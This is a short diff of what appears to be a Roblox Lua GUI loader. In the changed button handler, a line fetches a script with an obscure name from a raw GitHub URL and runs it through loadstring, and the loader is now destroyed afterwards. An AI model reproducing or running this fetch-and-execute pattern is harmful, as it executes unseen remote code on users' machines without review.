@@ -84,9 +84,9 @@ Load.TextScaled = true
 Load.TextSize = 45.000
 Load.TextWrapped = true
 Load.MouseButton1Down:Connect(function()
-	 Loader:Destroy()
-		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Des5dw/ars2/main/asfkjzkxljhvusaiuvhisuhv"), true))()
-     
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Des5dw/ars2/main/asfkjzkxljhvusaiuvhisuhv"), true))()
+  Loader:Destroy()
 end)
 
 UITextSizeConstraint_3.Parent = Load
